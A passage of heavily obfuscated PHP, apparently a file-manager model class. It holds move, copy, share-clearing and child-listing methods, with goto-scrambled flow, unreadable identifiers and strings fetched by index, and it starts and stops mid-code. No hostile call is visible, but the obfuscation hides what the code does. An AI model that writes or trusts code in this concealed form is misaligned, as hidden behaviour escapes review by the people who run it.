goto e¸´¡ëƒ‰; C‚·¾—ï: } private function _childrenMakeRelation($Dïé°íÆïÑ, $A‰¡´¯¢—) { $c°°Æò¡ =& $_SERVER[úÎü]; $dºÖÍ¸Ïò‘ = array(); $B¯«Ê¨É¹» = array(); foreach ($Dïé°íÆïÑ as $A†Ãì­ëÇ‹) { $FË‡¹‰ç›œ = $A†Ãì­ëÇ‹[$c°°Æò¡[28]] . $c°°Æò¡[8] . $A†Ãì­ëÇ‹[$c°°Æò¡[476]]; $dºÖÍ¸Ïò‘[$FË‡¹‰ç›œ] = $A†Ãì­ëÇ‹[$c°°Æò¡[385]]; } foreach ($A‰¡´¯¢— as $A†Ãì­ëÇ‹) { $FË‡¹‰ç›œ = $A†Ãì­ëÇ‹[$c°°Æò¡[28]] . $c°°Æò¡[8] . $A†Ãì­ëÇ‹[$c°°Æò¡[476]]; $E‹˜–šİ‡â = $dºÖÍ¸Ïò‘[$FË‡¹‰ç›œ]; $B¯«Ê¨É¹»[$E‹˜–šİ‡â] = $A†Ãì­ëÇ‹[$c°°Æò¡[385]]; } return $B¯«Ê¨É¹»; } private function _childrenMatch($F±ÂÂ¹ô, $aÃò…Ÿ„ˆµ, $Dªâ×Ç”) { goto DÒùøßĞœ; d¯Ú›¹öù‘: foreach ($C Øï’‚Ú as $b–‚òŒ›Ùù) { if (isset($F±ÂÂ¹ô[$b–‚òŒ›Ùù])) { $fÜÒ Ê¦ Œ .= $F±ÂÂ¹ô[$b–‚òŒ›Ùù] . $AÒ¡‚Á¼ë¸[534]; } } $fÜÒ Ê¦ Œ = rtrim($fÜÒ Ê¦ Œ, $AÒ¡‚Á¼ë¸[47]) . $AÒ¡‚Á¼ë¸[47]; $F¥§ä‹ÛªÒ = $this->parentLevelArray($fÜÒ Ê¦ Œ); goto E”ÄË¼¡æ’; DÒùøßĞœ: $AÒ¡‚Á¼ë¸ =& $_SERVER[úÎü]; $fÜÒ Ê¦ Œ = $Dªâ×Ç”[$AÒ¡‚Á¼ë¸[476]]; $C Øï’‚Ú = $this->parentLevelArray($aÃò…Ÿ„ˆµ[$AÒ¡‚Á¼ë¸[476]]); goto d¯Ú›¹öù‘; E”ÄË¼¡æ’: $b‡‡é‚ŒÒ = $F¥§ä‹ÛªÒ[count($F¥§ä‹ÛªÒ) - 1]; return array($AÒ¡‚Á¼ë¸[478] => $b‡‡é‚ŒÒ, $AÒ¡‚Á¼ë¸[476] => $fÜÒ Ê¦ Œ); goto dÄÄêÊÄ‡è; dÄÄêÊÄ‡è: } private function _makeItemData($c£Æ­ÈÀœ¢, $DÛ¸¯Ø—Ü, $Eêµ¸ÓÁ‹Ë) { $e‰¨À¬…º¥ =& $_SERVER[úÎü]; $A†Ä­Ö˜ = array($e‰¨À¬…º¥[535] => $c£Æ­ÈÀœ¢[$e‰¨À¬…º¥[386]], $e‰¨À¬…º¥[402] => $Eêµ¸ÓÁ‹Ë, $e‰¨À¬…º¥[536] => $c£Æ­ÈÀœ¢[$e‰¨À¬…º¥[388]], $e‰¨À¬…º¥[436] => $c£Æ­ÈÀœ¢[$e‰¨À¬…º¥[435]], $e‰¨À¬…º¥[537] => $c£Æ­ÈÀœ¢[$e‰¨À¬…º¥[77]], $e‰¨À¬…º¥[538] => $DÛ¸¯Ø—Ü[$e‰¨À¬…º¥[387]], $e‰¨À¬…º¥[539] => $DÛ¸¯Ø—Ü[$e‰¨À¬…º¥[473]], $e‰¨À¬…º¥[540] => USER_ID, $e‰¨À¬…º¥[541] => USER_ID, $e‰¨À¬…º¥[384] => $DÛ¸¯Ø—Ü[$e‰¨À¬…º¥[385]], $e‰¨À¬…º¥[542] => $DÛ¸¯Ø—Ü[$e‰¨À¬…º¥[476]] . $DÛ¸¯Ø—Ü[$e‰¨À¬…º¥[385]] . $e‰¨À¬…º¥[47], $e‰¨À¬…º¥[412] => 0, $e‰¨À¬…º¥[543] => $e‰¨À¬…º¥[33]); return $A†Ä­Ö˜; } private function _copyApplyMeta($Eåå¤¦œƒ, &$F—ëŠŸä•) { $aêæÌÜ¼’œ =& $_SERVER[úÎü]; $fºÑ¦‹Ş˜š = $Eåå¤¦œƒ[$aêæÌÜ¼’œ[385]]; $d˜£õšÔæƒ = $Eåå¤¦œƒ[$aêæÌÜ¼’œ[28]]; if (!isset($Eåå¤¦œƒ[$aêæÌÜ¼’œ[544]]) || !$Eåå¤¦œƒ[$aêæÌÜ¼’œ[544]] || $Eåå¤¦œƒ[$aêæÌÜ¼’œ[544]] == $aêæÌÜ¼’œ[485]) { $F—ëŠŸä•[$aêæÌÜ¼’œ[520]][] = array($aêæÌÜ¼’œ[385], $fºÑ¦‹Ş˜š, $aêæÌÜ¼’œ[544], short_id($fºÑ¦‹Ş˜š)); } if (Input::check($d˜£õšÔæƒ, $aêæÌÜ¼’œ[545])) { $F—ëŠŸä•[$aêæÌÜ¼’œ[519]][] = array($aêæÌÜ¼’œ[385] => $fºÑ¦‹Ş˜š, $aêæÌÜ¼’œ[89] => $aêæÌÜ¼’œ[432], $aêæÌÜ¼’œ[366] => str_replace($aêæÌÜ¼’œ[50], $aêæÌÜ¼’œ[33], Pinyin::encode($d˜£õšÔæƒ))); $F—ëŠŸä•[$aêæÌÜ¼’œ[519]][] = array($aêæÌÜ¼’œ[385] => $fºÑ¦‹Ş˜š, $aêæÌÜ¼’œ[89] => $aêæÌÜ¼’œ[431], $aêæÌÜ¼’œ[366] => Pinyin::encode($d˜£õšÔæƒ, $aêæÌÜ¼’œ[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A÷°Ÿˆ…¶³) { goto aâİ›ƒ§“; aâİ›ƒ§“: $dÊ½°ËÜµ¶ =& $_SERVER[úÎü]; $eŞªË¸ŞŒ = $this->sourceInfo($A÷°Ÿˆ…¶³); $d™£…Û¿ = $dÊ½°ËÜµ¶[414]; goto dø˜ŸËÒ‰İ; Aäö¯¨‰ƒ’: $e®Ø¼œğ‡ = array_to_keyvalue($e®Ø¼œğ‡, $dÊ½°ËÜµ¶[385]); foreach ($e®Ø¼œğ‡ as $fÈÕ°¬—) { $f©»¹”ä› = $fÈÕ°¬—[$dÊ½°ËÜµ¶[478]]; $A÷°Ÿˆ…¶³ = $fÈÕ°¬—[$dÊ½°ËÜµ¶[385]]; if (!isset($this->_childrenListCache[$A÷°Ÿˆ…¶³]) && $fÈÕ°¬—[$dÊ½°ËÜµ¶[386]] == $dÊ½°ËÜµ¶[83]) { $this->_childrenListCache[$A÷°Ÿˆ…¶³] = array(); } if (!isset($this->_childrenListCache[$f©»¹”ä›])) { $this->_childrenListCache[$f©»¹”ä›] = array(); } $this->_childrenListCache[$f©»¹”ä›][$A÷°Ÿˆ…¶³] = $fÈÕ°¬—; $this->_childrenItemCache[$A÷°Ÿˆ…¶³] = $fÈÕ°¬—; } goto f›ğËË……; dø˜ŸËÒ‰İ: $cš—¬·‘æ = array($dÊ½°ËÜµ¶[476] => array($dÊ½°ËÜµ¶[500], $eŞªË¸ŞŒ[$dÊ½°ËÜµ¶[476]] . $A÷°Ÿˆ…¶³ . $dÊ½°ËÜµ¶[501]), $dÊ½°ËÜµ¶[413] => $this->targetIsDelete); $e®Ø¼œğ‡ = $this->field($d™£…Û¿)->where($cš—¬·‘æ)->select(); if (!$e®Ø¼œğ‡) { return; } goto Aäö¯¨‰ƒ’; f›ğËË……: } private function _childrenListAll($f°£§Ú×‹‡, &$A°Ş•Î•ÅË) { $EõõÄÚ“ÃÂ =& $_SERVER[úÎü]; if (!isset($this->_childrenListCache[$f°£§Ú×‹‡])) { return; } $FÅâà¡ô = $this->_childrenListCache[$f°£§Ú×‹‡]; foreach ($FÅâà¡ô as $C…Á¨›¾ñ => $Fˆ™íŒšİ°) { $A°Ş•Î•ÅË[$C…Á¨›¾ñ] = $Fˆ™íŒšİ°; if ($Fˆ™íŒšİ°[$EõõÄÚ“ÃÂ[386]] == $EõõÄÚ“ÃÂ[83]) { $this->_childrenListAll($C…Á¨›¾ñ, $A°Ş•Î•ÅË); } } } private function sourceInfoCache($Dì¼Íìœ¨Ô) { if (isset($this->_childrenItemCache[$Dì¼Íìœ¨Ô])) { return $this->_childrenItemCache[$Dì¼Íìœ¨Ô]; } return $this->sourceInfo($Dì¼Íìœ¨Ô); } private function _childrenList($f†Üâ…ÈÉ¨) { if (isset($this->_childrenListCache[$f†Üâ…ÈÉ¨])) { return $this->_childrenListCache[$f†Üâ…ÈÉ¨]; } return $this->_childrenListSelect($f†Üâ…ÈÉ¨); } private function _childrenListSelect($EÖÄùÏ÷Ë) { goto Dööºçƒ“Ê; Dööºçƒ“Ê: $fŸ«Ó¾ã·ì =& $_SERVER[úÎü]; $A‰ †àê = array($fŸ«Ó¾ã·ì[478] => $EÖÄùÏ÷Ë, $fŸ«Ó¾ã·ì[413] => $this->targetIsDelete); $BÉ™³’ºÈ¶ = $this->where($A‰ †àê)->select(); goto Aù–ÑÎÚ¿œ; Aù–ÑÎÚ¿œ: $BÉ™³’ºÈ¶ = $BÉ™³’ºÈ¶ ? $BÉ™³’ºÈ¶ : array(); $CÈ—¤Ÿ®›ç = array_to_keyvalue($BÉ™³’ºÈ¶, $fŸ«Ó¾ã·ì[385]); $this->_childrenListCache[$EÖÄùÏ÷Ë] = $CÈ—¤Ÿ®›ç; goto d™‰ïšÎ”ˆ; d™‰ïšÎ”ˆ: foreach ($CÈ—¤Ÿ®›ç as $EÖÄùÏ÷Ë => $AË…ºª¤ğÁ) { $this->_childrenItemCache[$EÖÄùÏ÷Ë] = $AË…ºª¤ğÁ; } return $CÈ—¤Ÿ®›ç; goto b…Ñõµõ‚ù; b…Ñõµõ‚ù: } private function fileNameExistCache($a›ö‡‹È¢´, $DÌ‚­¸†Ì±) { $D¶¶§¢ë×Ô =& $_SERVER[úÎü]; $DÌ‚­¸†Ì± = strtolower($DÌ‚­¸†Ì±); $cù¥‚İÂ¦ = $this->_childrenList($a›ö‡‹È¢´); foreach ($cù¥‚İÂ¦ as $B¡ÊÚæºÇâ) { if ($DÌ‚­¸†Ì± == strtolower($B¡ÊÚæºÇâ[$D¶¶§¢ë×Ô[28]])) { return $B¡ÊÚæºÇâ[$D¶¶§¢ë×Ô[385]]; } } return !1; } private function fileNameAutoCache($F¿ò¹ïó†, $aòÓßáÂÃŒ, $dÛİàºäŠ, $E¯¨¹ÛÔñª) { $Aõíó‰é¥ =& $_SERVER[úÎü]; $A¸Ğ¿òš«¦ = $this->_childrenList($F¿ò¹ïó†); $E®ãæ¾ñ£˜ = array_to_keyvalue($A¸Ğ¿òš«¦, $Aõíó‰é¥[33], $Aõíó‰é¥[28]); return $this->fileNameAutoGet($E®ãæ¾ñ£˜, $aòÓßáÂÃŒ, $dÛİàºäŠ, $E¯¨¹ÛÔñª); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($f‰ª ìèŒ, $f—‚ŞËßÎí, $E¨äÜŒŠ£Í = REPEAT_REPLACE, $aÅÆ“ñ«ò„ = '') { goto eÄ²ÊÛß¨š; CŞö­²µ™Ñ: return $Bî§ãÆÁ—; goto e©²Ÿ¦í“¥; A„˜×”¼: $f²ßÛ–†»‹ = $this->fileNameExistCache($f—‚ŞËßÎí, $b–˜µ‹ƒİ²[$a×‡î·¥„[28]]); $Bî§ãÆÁ— = $this->_move($f‰ª ìèŒ, $f—‚ŞËßÎí, $E¨äÜŒŠ£Í, $eôñ·¥–ÂÀ, $aÅÆ“ñ«ò„); $this->sourceCacheClear(); goto C´®„…è; d—‡ºÑ­†Ö: $this->lockWriteStart($f—‚ŞËßÎí, $CÖÍÕÙ…¶à); $eôñ·¥–ÂÀ = array($a×‡î·¥„[518] => array(), $a×‡î·¥„[549] => !1); $this->clearShare($f‰ª ìèŒ, $f—‚ŞËßÎí); goto A„˜×”¼; FÁ»’¶¥©Œ: $this->updateModifyTime($c—Ñ¾ƒòÚ); Model($a×‡î·¥„[522])->eventMove($f‰ª ìèŒ, $b–˜µ‹ƒİ²[$a×‡î·¥„[478]], $f—‚ŞËßÎí); Hook::trigger($a×‡î·¥„[548], $DŠ¡Ë¶Ç©); goto CŞö­²µ™Ñ; B¯Éë‰¶¬‘: if ($b–˜µ‹ƒİ²[$a×‡î·¥„[478]] == $cˆåĞ’ÄÖ[$a×‡î·¥„[385]]) { if ($b–˜µ‹ƒİ²[$a×‡î·¥„[413]] == $a×‡î·¥„[83]) { Model($a×‡î·¥„[411])->restore(array($f‰ª ìèŒ)); } if (!$aÅÆ“ñ«ò„ || $aÅÆ“ñ«ò„ == $b–˜µ‹ƒİ²[$a×‡î·¥„[28]]) { return $f‰ª ìèŒ; } } $DŠ¡Ë¶Ç© = $this->pathInfoMore($f‰ª ìèŒ); if ($this->isParentOf($f‰ª ìèŒ, $f—‚ŞËßÎí)) { return !1; } goto eà—„šçåŠ; eæ‹Îµã»Í: $this->folderSizeReset($f—‚ŞËßÎí); $c—Ñ¾ƒòÚ = array($b–˜µ‹ƒİ²[$a×‡î·¥„[478]], $f—‚ŞËßÎí); if ($b–˜µ‹ƒİ²[$a×‡î·¥„[386]] == $a×‡î·¥„[83]) { $c—Ñ¾ƒòÚ[] = $f‰ª ìèŒ; } goto FÁ»’¶¥©Œ; eà—„šçåŠ: if (!$b–˜µ‹ƒİ² || !$cˆåĞ’ÄÖ || $cˆåĞ’ÄÖ[$a×‡î·¥„[386]] != $a×‡î·¥„[83]) { return !1; } Hook::trigger($a×‡î·¥„[547], $DŠ¡Ë¶Ç©); $this->targetIsDelete = intval($b–˜µ‹ƒİ²[$a×‡î·¥„[413]]); goto E‰‡ÕÎ† ç; C´®„…è: if ($b–˜µ‹ƒİ²[$a×‡î·¥„[386]] == $a×‡î·¥„[83] && $f²ßÛ–†»‹) { $this->folderSizeResetChildren($Bî§ãÆÁ—); } Model($a×‡î·¥„[171])->linkAdd($eôñ·¥–ÂÀ[$a×‡î·¥„[518]]); if ($f²ßÛ–†»‹ && $eôñ·¥–ÂÀ[$a×‡î·¥„[549]]) { $this->removeNow($f‰ª ìèŒ, !1); } goto fİº¦ÄÛÎ; eÄ²ÊÛß¨š: $a×‡î·¥„ =& $_SERVER[úÎü]; $b–˜µ‹ƒİ² = $this->sourceInfo($f‰ª ìèŒ); $cˆåĞ’ÄÖ = $this->sourceInfo($f—‚ŞËßÎí); goto B¯Éë‰¶¬‘; E‰‡ÕÎ† ç: if ($b–˜µ‹ƒİ²[$a×‡î·¥„[478]] == $f—‚ŞËßÎí && $aÅÆ“ñ«ò„ != $b–˜µ‹ƒİ²[$a×‡î·¥„[28]]) { $aİÀÛá¶ˆ™ = $this->fileNameExist($f—‚ŞËßÎí, $aÅÆ“ñ«ò„); if ($aİÀÛá¶ˆ™ && $b–˜µ‹ƒİ²[$a×‡î·¥„[386]] == $a×‡î·¥„[485]) { goto e‹ñ´‚½ÛÏ; aß‡ŠÕ‰ÖÈ: $this->removeNow($f‰ª ìèŒ, !1); $this->folderSizeReset($f—‚ŞËßÎí); Hook::trigger($a×‡î·¥„[548], $DŠ¡Ë¶Ç©); goto A™´Ùâ½¨; e‹ñ´‚½ÛÏ: $CåÆŠ»£à¿ = $this->sourceInfo($aİÀÛá¶ˆ™); $aŒ¾ßØ®°£ = $this->fileHistory($CåÆŠ»£à¿, $b–˜µ‹ƒİ²[$a×‡î·¥„[435]], $b–˜µ‹ƒİ²[$a×‡î·¥„[77]]); if (!$aŒ¾ßØ®°£) { Model($a×‡î·¥„[438])->remove($b–˜µ‹ƒİ²[$a×‡î·¥„[435]]); } goto aß‡ŠÕ‰ÖÈ; A™´Ùâ½¨: return $aİÀÛá¶ˆ™; goto c¨Ïñİ¢¯Ğ; c¨Ïñİ¢¯Ğ: } } $CÖÍÕÙ…¶à = $aÅÆ“ñ«ò„ ? $aÅÆ“ñ«ò„ : $b–˜µ‹ƒİ²[$a×‡î·¥„[28]]; $this->lockMoveStart($f‰ª ìèŒ); goto d—‡ºÑ­†Ö; fİº¦ÄÛÎ: $this->lockMoveEnd($f‰ª ìèŒ); $this->lockWriteEnd($f—‚ŞËßÎí, $CÖÍÕÙ…¶à); $this->folderSizeReset($b–˜µ‹ƒİ²[$a×‡î·¥„[478]]); goto eæ‹Îµã»Í; e©²Ÿ¦í“¥: } private function _move($FŠÕ“ŒÆœ‰, $a‰šŠÉŸ, $Cå„£î¡˜Â, &$DÏï ¢øí, $FÅíšùÄ¨… = '') { goto bƒÛØÑ‘©; f‹ìƒù¦ùİ: $F·’åŒ¿‘­ = $FÅíšùÄ¨… ? $FÅíšùÄ¨… : $dÏ—Œ›’ÕÊ[$A‚µ•‚â–¯[28]]; $D×¼±í£ğÊ = $this->fileNameExistCache($a‰šŠÉŸ, $F·’åŒ¿‘­); $this->lockMoveStart($FŠÕ“ŒÆœ‰); goto e…ñíµÖ·´; bƒÛØÑ‘©: $A‚µ•‚â–¯ =& $_SERVER[úÎü]; $dÏ—Œ›’ÕÊ = $this->sourceInfo($FŠÕ“ŒÆœ‰); $DŞ–ğ×áÈƒ = $dÏ—Œ›’ÕÊ[$A‚µ•‚â–¯[386]] == $A‚µ•‚â–¯[83]; goto f‹ìƒù¦ùİ; eù¥Á—¢•é: $bî§ºä½Í = !1; if ($DŞ–ğ×áÈƒ) { if ($Cå„£î¡˜Â == REPEAT_RENAME_FOLDER) { $F·’åŒ¿‘­ = $this->fileNameAuto($a‰šŠÉŸ, $F·’åŒ¿‘­, $Cå„£î¡˜Â, $DŞ–ğ×áÈƒ); $E„¤‹àÜˆ‹ = $this->_moveForce($FŠÕ“ŒÆœ‰, $a‰šŠÉŸ, $F·’åŒ¿‘­); } else { if ($Cå„£î¡˜Â == REPEAT_RENAME_FOLDER) { $Cå„£î¡˜Â = REPEAT_RENAME; } $fÆŠß§„Îá = $this->_childrenListSelect($FŠÕ“ŒÆœ‰); foreach ($fÆŠß§„Îá as $dŸÏ¯·Íˆ) { $this->_move($dŸÏ¯·Íˆ[$A‚µ•‚â–¯[385]], $D×¼±í£ğÊ, $Cå„£î¡˜Â, $DÏï ¢øí); } $bî§ºä½Í = !0; } } else { if ($Cå„£î¡˜Â == REPEAT_SKIP) { $bî§ºä½Í = !0; } else { if ($Cå„£î¡˜Â == REPEAT_RENAME || $Cå„£î¡˜Â == REPEAT_RENAME_FOLDER) { $F·’åŒ¿‘­ = $this->fileNameAuto($a‰šŠÉŸ, $F·’åŒ¿‘­, $Cå„£î¡˜Â, $DŞ–ğ×áÈƒ); $E„¤‹àÜˆ‹ = $this->_moveForce($FŠÕ“ŒÆœ‰, $a‰šŠÉŸ, $F·’åŒ¿‘­); } else { if ($Cå„£î¡˜Â == REPEAT_REPLACE) { $EÒâïºìÊÖ = $this->sourceInfoCache($D×¼±í£ğÊ); $eÛØÚ«µ¤æ = $this->fileHistory($EÒâïºìÊÖ, $dÏ—Œ›’ÕÊ[$A‚µ•‚â–¯[435]], $dÏ—Œ›’ÕÊ[$A‚µ•‚â–¯[77]]); if ($eÛØÚ«µ¤æ) { $DÏï ¢øí[$A‚µ•‚â–¯[518]][] = $dÏ—Œ›’ÕÊ[$A‚µ•‚â–¯[435]]; } else { $bî§ºä½Í = !0; } } } } } if ($bî§ºä½Í && !$DÏï ¢øí[$A‚µ•‚â–¯[549]]) { $DÏï ¢øí[$A‚µ•‚â–¯[549]] = !0; } goto D¤ÆÚ¨éé; D¤ÆÚ¨éé: return $E„¤‹àÜˆ‹; goto cºèÑªÇáÚ; e…ñíµÖ·´: $this->lockWriteStart($a‰šŠÉŸ, $F·’åŒ¿‘­); if (!$D×¼±í£ğÊ) { return $this->_moveForce($FŠÕ“ŒÆœ‰, $a‰šŠÉŸ, $F·’åŒ¿‘­); } $E„¤‹àÜˆ‹ = $D×¼±í£ğÊ; goto eù¥Á—¢•é; cºèÑªÇáÚ: } private function _moveForce($b²·ÔŒ¯¯¸, $fÁÕÁ÷„ñÇ, $e†•­ò®¥”) { goto aöº‚Ğšãù; F˜¥õ îï: $cˆ³¥¤™— = $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[386]] == $EÍÑ‹‘Ÿğô[83]; $Cåë¤‰… = array($EÍÑ‹‘Ÿğô[384] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[385]], $EÍÑ‹‘Ÿğô[542] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[476]] . $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[385]] . $EÍÑ‹‘Ÿğô[47], $EÍÑ‹‘Ÿğô[538] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[387]], $EÍÑ‹‘Ÿğô[539] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[473]], $EÍÑ‹‘Ÿğô[541] => USER_ID, $EÍÑ‹‘Ÿğô[402] => $e†•­ò®¥”); $D‘ŒÍ‰›Ëë = $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[387]] == SourceModel::TYPE_GROUP && $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[387]] == SourceModel::TYPE_GROUP && $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[473]] == $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[473]]; goto f¦£¨Ò»¥; f¦£¨Ò»¥: if (!$D‘ŒÍ‰›Ëë) { Model($EÍÑ‹‘Ÿğô[471])->authClear($b²·ÔŒ¯¯¸); } $BÔÑ¦¦˜¯¶ = $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[413]] == $EÍÑ‹‘Ÿğô[83] && $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[413]] != $EÍÑ‹‘Ÿğô[83]; if ($BÔÑ¦¦˜¯¶) { $Cåë¤‰…[$EÍÑ‹‘Ÿğô[412]] = 0; } goto f¹ŒêÇª…²; aöº‚Ğšãù: $EÍÑ‹‘Ÿğô =& $_SERVER[úÎü]; $cÉï«¼¼Ñ = $this->sourceInfo($b²·ÔŒ¯¯¸); $DéÇ ÂÍøÄ = $this->sourceInfo($fÁÕÁ÷„ñÇ); goto F˜¥õ îï; f¹ŒêÇª…²: if ($cˆ³¥¤™—) { $B­Ó’ ·” = array($EÍÑ‹‘Ÿğô[542] => array($EÍÑ‹‘Ÿğô[500], $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[476]] . $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[385]] . $EÍÑ‹‘Ÿğô[501])); $d˜«…ä‰©ª = $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[476]] . $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[385]] . $EÍÑ‹‘Ÿğô[47]; $cÓ†¯º‰ß = $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[476]] . $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[385]] . $EÍÑ‹‘Ÿğô[47] . $cÉï«¼¼Ñ[$EÍÑ‹‘Ÿğô[385]] . $EÍÑ‹‘Ÿğô[47]; $d¹¶ì£Áò³ = array($EÍÑ‹‘Ÿğô[542] => array($EÍÑ‹‘Ÿğô[550], "\x72\145\160\154\x61\143\x65\x28\x70\141\x72\x65\x6e\164\x4c\x65\x76\145\154\x2c\x27{$d˜«…ä‰©ª}\47\x2c\47{$cÓ†¯º‰ß}\x27\x29"), $EÍÑ‹‘Ÿğô[538] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[387]], $EÍÑ‹‘Ÿğô[539] => $DéÇ ÂÍøÄ[$EÍÑ‹‘Ÿğô[473]]); if ($BÔÑ¦¦˜¯¶) { $d¹¶ì£Áò³[$EÍÑ‹‘Ÿğô[412]] = 0; } $this->where($B­Ó’ ·”)->data($d¹¶ì£Áò³)->save(); } $this->where(array($EÍÑ‹‘Ÿğô[399] => $b²·ÔŒ¯¯¸))->data($Cåë¤‰…)->save(); return $b²·ÔŒ¯¯¸; goto dÙÒç­ƒ“; dÙÒç­ƒ“: } private function clearShare($Fƒ§áºÚæ‹, $f‰ãÂæ†«) { goto dõ£ƒŒ¼; dõ£ƒŒ¼: $BÎÊŒ£Ù„ =& $_SERVER[úÎü]; $D¾ñÄ²‚Å = $this->sourceInfo($Fƒ§áºÚæ‹); $Då“ŠèÚÈÜ = $this->sourceInfo($f‰ãÂæ†«); goto aŸ»è’¹; a®ª¼ÔáŠÉ: if (!$aÕÂ—³¥’) { return; } $BÛéŸÈ ØÃ = array($BÎÊŒ£Ù„[385] => array($BÎÊŒ£Ù„[7], $aÕÂ—³¥’), $BÎÊŒ£Ù„[463] => 1); $F¢óôß¿„ = Model($BÎÊŒ£Ù„[552])->field($BÎÊŒ£Ù„[456])->where($BÛéŸÈ ØÃ)->select(); goto Fã¾†«àÓ›; aèõ¤öœ¡±: Model($BÎÊŒ£Ù„[552])->where($BÛéŸÈ ØÃ)->save(array($BÎÊŒ£Ù„[463] => 0)); Model($BÎÊŒ£Ù„[553])->where($BÛéŸÈ ØÃ)->delete(); goto dÜ ¤Ú¸•“; aŸ»è’¹: if ($D¾ñÄ²‚Å[$BÎÊŒ£Ù„[473]] == $Då“ŠèÚÈÜ[$BÎÊŒ£Ù„[473]] && $D¾ñÄ²‚Å[$BÎÊŒ£Ù„[387]] == $BÎÊŒ£Ù„[551]) { return; } $BÛéŸÈ ØÃ = array($BÎÊŒ£Ù„[476] => array($BÎÊŒ£Ù„[500], $D¾ñÄ²‚Å[$BÎÊŒ£Ù„[476]] . $Fƒ§áºÚæ‹ . $BÎÊŒ£Ù„[501])); $aÕÂ—³¥’ = $this->field($BÎÊŒ£Ù„[399])->where($BÛéŸÈ ØÃ)->getField($BÎÊŒ£Ù„[385], !0); goto a®ª¼ÔáŠÉ; Fã¾†«àÓ›: if (!$F¢óôß¿„) { return; } $F¢óôß¿„ = array_to_keyvalue($F¢óôß¿„, $BÎÊŒ£Ù„[33], $BÎÊŒ£Ù„[456]); $BÛéŸÈ ØÃ = array($BÎÊŒ£Ù„[456] => array($BÎÊŒ£Ù„[7], $F¢óôß¿„)); goto aèõ¤öœ¡±; dÜ ¤Ú¸•“: } public function copyFolderFromIO($bÃ™ÑªÇÔ“, $bïÙ²ŸÀÛ†, $DõÈ±‚øŒË, $FÃšğïí•ê, $eĞ‰î¯¡å, $EˆÑàêç’Ò = false) { goto CØ¬äø’ƒ†; a½‹ˆ‹¤¬‹: if ($AŒ¡‰ĞÄÁ…) { $this->_childrenAllMake($AŒ¡‰ĞÄÁ…); } Hook::trigger($f¨ğ±¸¼µ°[555]); $this->_copyChildTo($bÃ™ÑªÇÔ“, $bïÙ²ŸÀÛ†, $dâ„Áì‹ç, $FÃšğïí•ê, $bˆŞê©Ã§, $eĞ‰î¯¡å); goto FĞ´ŞŞãè; CØ¬äø’ƒ†: $f¨ğ±¸¼µ° =& $_SERVER[úÎü]; $bˆŞê©Ã§ = array($f¨ğ±¸¼µ°[519] => array(), $f¨ğ±¸¼µ°[520] => array(), $f¨ğ±¸¼µ°[518] => array(), $f¨ğ±¸¼µ°[554] => array()); $bº‘ï½êÀİ = $EˆÑàêç’Ò ? $EˆÑàêç’Ò : $bÃ™ÑªÇÔ“->pathThis($bïÙ²ŸÀÛ†); goto AùàŠë–ó˜; b§¬õ°Œ¥¾: Model($f¨ğ±¸¼µ°[438])->linkAdd($bˆŞê©Ã§[$f¨ğ±¸¼µ°[518]]); Model($f¨ğ±¸¼µ°[438])->remove($bˆŞê©Ã§[$f¨ğ±¸¼µ°[554]]); $this->folderSizeReset($DõÈ±‚øŒË); goto BÆœêÛÎ³; D•ëÈÆîÎØ: Model($f¨ğ±¸¼µ°[521])->addAll($bˆŞê©Ã§[$f¨ğ±¸¼µ°[519]], array(), !0); Model($f¨ğ±¸¼µ°[522])->eventCopy($dâ„Áì‹ç); $this->saveAll($bˆŞê©Ã§[$f¨ğ±¸¼µ°[520]]); goto b§¬õ°Œ¥¾; FĞ´ŞŞãè: Hook::trigger($f¨ğ±¸¼µ°[556]); if ($dâ„Áì‹ç) { $this->folderSizeResetChildren($dâ„Áì‹ç); } $this->_childrenListClear(); goto D•ëÈÆîÎØ; BÆœêÛÎ³: $this->updateModifyTime($DõÈ±‚øŒË); return $dâ„Áì‹ç; goto FõÅİ†Äå–; AùàŠë–ó˜: $AŒ¡‰ĞÄÁ… = $this->fileNameExist($DõÈ±‚øŒË, $bº‘ï½êÀİ); $dâ„Áì‹ç = $this->mkdir($DõÈ±‚øŒË, $bº‘ï½êÀİ, $FÃšğïí•ê); if (!$AŒ¡‰ĞÄÁ… || $FÃšğïí•ê == REPEAT_RENAME_FOLDER) { $FÃšğïí•ê = !1; } goto a½‹ˆ‹¤¬‹; FõÅİ†Äå–: } private function _copyChildTo($D™¶Ü›ò‡, $eùÂßÑÔ¤î, $F¬•í”Æœ, $b›àå¬‹²Ä, &$Eê’ÌãÖ, $FšÂ÷‘Îª) { goto bÎÁîÓ·×¬; f¾æš¡¿Ñ¾: $FÏÎ¾ÏÌêÆ = $this->_childrenList($F¬•í”Æœ); $FÏÎ¾ÏÌêÆ = array_to_keyvalue($FÏÎ¾ÏÌêÆ, $Añ¹¯×õì‹[28]); foreach ($D¢ò‹‘ÓÒ× as $E¿ô¨ÂÉÊÍ) { $dµŒÃŒñ¯™ = $FÏÎ¾ÏÌêÆ[$E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[28]]]; $aÀĞÚŒ÷Õ = $dµŒÃŒñ¯™[$Añ¹¯×õì‹[385]]; $this->_copyApplyMeta($dµŒÃŒñ¯™, $Eê’ÌãÖ); if ($E¿ô¨ÂÉÊÍ[$Añ¹¯×õì‹[29]] == $Añ¹¯×õì‹[76]) { 